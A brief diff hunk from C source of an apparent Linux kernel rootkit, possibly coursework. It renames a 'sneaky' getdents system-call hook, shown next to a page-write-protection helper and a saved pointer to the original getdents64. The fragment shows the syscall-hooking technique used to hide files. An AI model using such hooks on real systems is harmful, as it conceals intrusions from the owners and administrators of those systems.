@@ -46,7 +46,7 @@ int disable_page_rw(void *ptr){
 
 asmlinkage int (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirptr,unsigned int count);
 
-asmlinkage long sneaky_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirptr, unsigned int count)
+asmlinkage long sneaky_sys_getdents(unsigned int fd, struct linux_dirent64 *dirptr, unsigned int count)
 {
   printk(KERN_INFO "Sneaky getdents is called.\n");
   int nread,bpos;
